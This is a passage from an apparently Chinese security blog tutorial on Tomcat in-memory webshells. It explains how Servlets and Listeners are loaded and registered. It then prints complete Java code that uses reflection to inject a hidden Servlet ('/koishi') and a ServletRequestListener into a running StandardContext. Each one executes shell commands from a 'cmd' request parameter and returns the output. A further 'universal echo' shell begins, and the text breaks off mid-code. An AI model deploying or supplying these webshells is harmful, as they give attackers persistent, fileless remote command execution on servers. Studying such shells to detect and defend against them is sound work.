                     data-src="/images/blog/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-16673738253923.png"
                      alt="img"
                ></p>
<p>前面已经完成了将所有 servlet 添加到 context 的 children 中，this.findChildren()即把所有Wapper（负责管理Servlet）传入loadOnStartup()中处理，可想而知loadOnStartup()就是负责动态添加Servlet的一个函数：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-16673738718869.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-166737390543912.png"
                      alt="img"
                ></p>
<p>首先获取Context下所有的Wapper类，并获取到每个Servlet的启动顺序，删选出 &gt;&#x3D; 0 的项加载到一个存放Wapper的list中。</p>
<p>如果在web.xml 中servlet未声明  load-on-startup 的值，则默认-1，表示不加载</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-166737397584915.png"
                      alt="img"
                ></p>
<p><strong>则该Servlet不会被动态添加到容器：</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-166737399110518.png"
                      alt="img"
                ></p>
<p><strong>然后对每个wapper进行装载：</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FuZ3J5X3Byb2dyYW0=,size_16,color_FFFFFF,t_70-166737404687621.png"
                      alt="img"
                ></p>
<blockquote>
<p>装载：启动服务器时加载Servlet的实例</p>
<p>初始化：web服务器启动时或web服务器接收到请求时，或者两者之间的某个时刻启动。初始化工作有init()方法负责执行完成</p>
<p>调用：即每次调用Servlet的service()，从第一次到以后的多次访问，都是只是调用doGet()或doPost()方法（doGet、doPost内部实现，具体参照HttpServlet类service()的重写）（和之前filter写dofilter是一样的目的）</p>
<p>销毁：停止服务器时调用destroy()方法，销毁实例</p>
</blockquote>
<p><strong>因此severlet内存马的构建思路差不多就有了</strong></p>
<blockquote>
<p>context 中获取StandardContext 对象</p>
<p>使用 Wrapper 封装我们的 Servlet </p>
<p>向 standardContext 的 children 中添加我们封装好的 wrapper</p>
</blockquote>
<h3 id="正式书写内存马"><a href="#正式书写内存马" class="headerlink" title="正式书写内存马"></a>正式书写内存马</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Servlet;</span><br><span class="line"><span class="keyword">import</span> com.tomcat.util.ClassUtil;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Wrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KoishiMemServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">urlPattern</span> <span class="operator">=</span> <span class="string">&quot;/koishi&quot;</span>;</span><br><span class="line">            <span class="comment">//String urlPattern = &quot;*&quot;;</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> <span class="string">&quot;cirno&quot;</span>;</span><br><span class="line">            <span class="comment">// 从 request 中获取 servletContext</span></span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> req.getSession().getServletContext();</span><br><span class="line">            <span class="comment">// 如果已有此 servletName 的 Servlet，则不再重复添加</span></span><br><span class="line">            <span class="keyword">if</span>(servletContext.getServletRegistration(servletName) == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 反射获取 context，和 filter 差不多</span></span><br><span class="line">                <span class="type">Field</span> <span class="variable">servletfield</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                servletfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) servletfield.get(servletContext);</span><br><span class="line"></span><br><span class="line">                <span class="type">Field</span> <span class="variable">contextfield</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                contextfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) contextfield.get(applicationContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象</span></span><br><span class="line"><span class="comment">                StandardContext o = null;</span></span><br><span class="line"><span class="comment">                while (o == null) &#123;</span></span><br><span class="line"><span class="comment">                    Field f = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span></span><br><span class="line"><span class="comment">                    f.setAccessible(true);</span></span><br><span class="line"><span class="comment">                    Object object = f.get(servletContext);</span></span><br><span class="line"><span class="comment">                    if (object instanceof ServletContext) &#123;</span></span><br><span class="line"><span class="comment">                        servletContext = (ServletContext) object;</span></span><br><span class="line"><span class="comment">                    &#125; else if (object instanceof StandardContext) &#123;</span></span><br><span class="line"><span class="comment">                        o = (StandardContext) object;</span></span><br><span class="line"><span class="comment">                    &#125;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">//新建servlet</span></span><br><span class="line">                <span class="comment">//Class&lt;?&gt; classServlet = ClassUtil.getClass(ClassUtil.SERVLET_STRING);</span></span><br><span class="line">                <span class="type">Servlet</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> servletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                            isLinux = <span class="literal">false</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">                        out.println(output);</span><br><span class="line">                        out.flush();</span><br><span class="line">                        out.close();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// 使用 Wrapper 封装 Servlet</span></span><br><span class="line">                <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">                <span class="comment">// 设置为1才会将Servlet添加至容器</span></span><br><span class="line">                <span class="comment">// 当值为0或者大于0时，表示容器在应用启动时就加载这个servlet；读取 web.xml中的每个Servlet 或者新建Servlet 默认是 -1</span></span><br><span class="line">                wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">                wrapper.setName(servletName);</span><br><span class="line">                wrapper.setServlet(servlet);</span><br><span class="line">                wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">            <span class="comment">// 向 children 中添加 wrapper</span></span><br><span class="line">                standardContext.addChild(wrapper);</span><br><span class="line">            <span class="comment">// 添加 servletMappings</span></span><br><span class="line">                standardContext.addServletMapping(urlPattern, servletName);</span><br><span class="line">                <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">                writer.println(<span class="string">&quot;inject KoishiMemServlet success !&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<h2 id="四、Listener内存马"><a href="#四、Listener内存马" class="headerlink" title="四、Listener内存马"></a>四、Listener内存马</h2><h3 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h3><p>请求网站的时候, 程序先执行listener监听器的内容：Listener -&gt; Filter -&gt; Servlet</p>
<p>在应用中可能调用的监听器如下：</p>
<blockquote>
<ul>
<li><p>ServletContextListener：用于监听整个 Servlet 上下文（创建、销毁）</p>
</li>
<li><p>ServletContextAttributeListener：对 Servlet 上下文属性进行监听（增删改属性）</p>
</li>
<li><p>ServletRequestListener：对 Request 请求进行监听（创建、销毁）</p>
</li>
<li><p>ServletRequestAttributeListener：对 Request 属性进行监听（增删改属性）</p>
</li>
<li><p>javax.servlet.http.HttpSessionListener：对 Session 整体状态的监听</p>
</li>
<li><p>javax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听</p>
</li>
</ul>
</blockquote>
<p>在 ServletRequestListener 接口中，提供两个方法：<code>requestInitialized</code> 和 <code>requestDestroyed</code>，两个方法均接收 ServletRequestEvent 作为参数，ServletRequestEvent 中又储存了 ServletContext 对象和 ServletRequest 对象，因此在访问请求过程中我们可以在 request 创建和销毁时实现自己的恶意代码，完成内存马的实现。 从中还可以获取到 StandardContext 对象，也就是可以在Listener的基础上添加动态FIlter。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1623578410672.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/1623640456652.png"
                      alt="img"
                ></p>
<p>Tomcat 中 EventListeners 存放在 StandardContext 的 applicationEventListenersObjects 属性中，同样可以使用 StandardContext 的相关 add 方法添加。</p>
<p>除了 EventListener，Tomcat 还存在了 LifecycleListener。但是用起来一定是不如 ServletRequestListener。 因为实现了<code>LifecycleListener</code>接口的监听器一般作用于tomcat初始化启动阶段，此时客户端的请求还没进入解析阶段，不适合用于内存马 。</p>
<p>（也就是说，Listener内存马大多数都是使用的他的 requestDestroyed 方法来保存我们的恶意代码，这样能确保被解析了）</p>
<h3 id="内存马代码"><a href="#内存马代码" class="headerlink" title="内存马代码"></a>内存马代码</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Listener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.tomcat.util.ClassUtil;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KoishiMemListener</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 获取 StandardContext#addApplicationEventListener</span></span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> req.getSession().getServletContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">servletfield</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            servletfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) servletfield.get(servletContext);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">contextfield</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            contextfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) contextfield.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//新建 Listener 不用像之前那样使用 wrapper 包装了，直接add即可</span></span><br><span class="line">            <span class="comment">//Class&lt;?&gt; classListener = ClassUtil.getClass(ClassUtil.LISTENER_STRING);</span></span><br><span class="line">            <span class="type">MyListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyListener</span>();</span><br><span class="line">            standardContext.addApplicationEventListener(listener);</span><br><span class="line"></span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">            writer.println(<span class="string">&quot;inject KoishiMemListener success !&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    in = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> s.hasNext()?s.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request)requestF.get(req);</span><br><span class="line">                    request.getResponse().getWriter().write(out);</span><br><span class="line">                    request.getResponse().getWriter().flush();</span><br><span class="line">                    request.getResponse().getWriter().close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">                <span class="keyword">catch</span> (NoSuchFieldException e) &#123;&#125;</span><br><span class="line">                <span class="keyword">catch</span> (IllegalAccessException e) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h2 id="五、Tomcat-回显马"><a href="#五、Tomcat-回显马" class="headerlink" title="五、Tomcat 回显马"></a>五、Tomcat 回显马</h2><p>tomcat马构造基础 <a class="link"   href="https://www.cnblogs.com/nice0e3/p/14622879.html" >Java安全之基于Tomcat实现内存马 - nice_0e3 - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本段参考：</p>
<p>文章一： <a class="link"   href="https://www.cnblogs.com/nice0e3/p/14891711.html#0x01-tomcat%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE" >Java安全之反序列化回显与内存马 - nice_0e3 - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>文章二：<a class="link"   href="https://www.cnblogs.com/akka1/p/16201272.html#autoid-3-0-0" >Tomcat通用回显学习 - akka1 - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="通用回显"><a href="#通用回显" class="headerlink" title="通用回显"></a>通用回显</h3><blockquote>
<p>按照我个人的理解来说其实只要能拿到<code>Request</code> 和<code>Response</code>对象即可进行回显的构造，当然这也是众多方式的一种。也是目前用的较多的方式。比如在Tomcat 全局存储的<code>Request</code> 和<code>Response</code>对象，进行获取后则可以在tomcat这个容器下进行回显。而某些漏洞的方式会从漏洞的位置去寻找存储<code>Request</code> 和<code>Response</code>对象的地方。</p>
</blockquote>
<p><a class="link"   href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3" >基于全局储存的新思路 | Tomcat的一种通用回显方法研究 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>说明在Tomcat启动的时候会调用该位置的 dorun 方法</p>
<p>大致思路</p>
<blockquote>
<ul>
<li><p>获取到<code>Http11Processor</code>对象即可获取到<code>Request</code>，<code>Response</code> ， <code>Http11Processor</code>继承<code>AbstractProcessor</code>类。 </p>
</li>
<li><p>而<code>AbstractProcessor</code>类中可见有<code>Request</code>，<code>Response</code>这两对象。 <code>AbstractProcessor</code>调用<code>this.register</code>将前面创建的<code>Http11Processor</code>对象进行传递。 随后调用<code>processor.getRequest().getRequestProcessor()</code>获取<code>RequestInfo</code> 。 </p>
</li>
<li><p>调用获取到的<code>RequestInfo</code>,这里为<code>rp</code>。rp的<code>setGlobalProcessor</code>将global进行传递，而<code>setGlobalProcessor</code>方法里面会调用<code>global.addRequestProcessor</code>将rp添加进去。 </p>
</li>
<li><p>再往后需要寻找存储<code>AbstractProtocol</code>类或继承<code>AbstractProtocol</code>类的子类。这里寻找到的是<code>Connector</code>成员变量中为<code>protocolHandler</code>属性的值，而 <code>Http11AprProtocol</code>类实现了该接口。 </p>
</li>
<li><p>在Tomcat启动过程中会将Connector放入Service中。 </p>
</li>
<li><p>StandardContext 中有我们需要的 service。</p>
</li>
</ul>
</blockquote>
<p>最后调用链为</p>
<p>（前面几步通过 <code>currentThread</code> 最终获取<code>StandardContext</code>， 因为我的tomcat版本问题，我改用了反射获取的方式）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">WebappClassLoaderBase---&gt;ApplicationContext(getResources().getContext())---&gt;StandardService---&gt;Connector---&gt;AbstractProtocol$ConnectoinHandler---&gt;RequestGroupInfo(global)---&gt;RequestInfo---&gt;Request---&gt;Response</span><br></pre></td></tr></table></figure></div>





<h4 id="tomcat马通用回显马："><a href="#tomcat马通用回显马：" class="headerlink" title="tomcat马通用回显马："></a><strong>tomcat马通用回显马：</strong></h4><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Tomcat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Service;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Connector;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardService;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.AbstractProtocol;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.RequestGroupInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.RequestInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Response;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**流程</span></span><br><span class="line"><span class="comment"> WebappClassLoaderBase---&gt;ApplicationContext(getResources().getContext())---&gt;</span></span><br><span class="line"><span class="comment"> StandardService---&gt;Connector---&gt;AbstractProtocol$ConnectoinHandler---&gt;</span></span><br><span class="line"><span class="comment"> RequestGroupInfo(global)---&gt;RequestInfo---&gt;Request---&gt;Response</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/demo&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatEcho_General</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">        //这里的代码也是为了获取 standardContext，tomcat8.5.77 测试可以使用。8.5.82之后就不行了，getResources返回值为null</span></span><br><span class="line"><span class="comment">        //WebappClassLoaderBase---&gt;ApplicationContext(getResources().getContext())</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span></span><br><span class="line"><span class="comment">        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取运行中的 standardContext，和之前的三个马一样,也可以用上面注释掉的方法，但是我的tomcat版本刚好高了一点，不行。</span></span><br><span class="line">        <span class="comment">//等效流程 WebappClassLoaderBase---&gt;ApplicationContext(getResources().getContext())</span></span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">servletfield</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            servletfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) servletfield.get(servletContext);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">contextfield</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            contextfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) contextfield.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">                获取 StandardContext 中的 context</span></span><br><span class="line"><span class="comment">                反射获取 ApplicationContext 上下文，因为其为 protected 修饰的</span></span><br><span class="line"><span class="comment">            **/</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context.setAccessible(<span 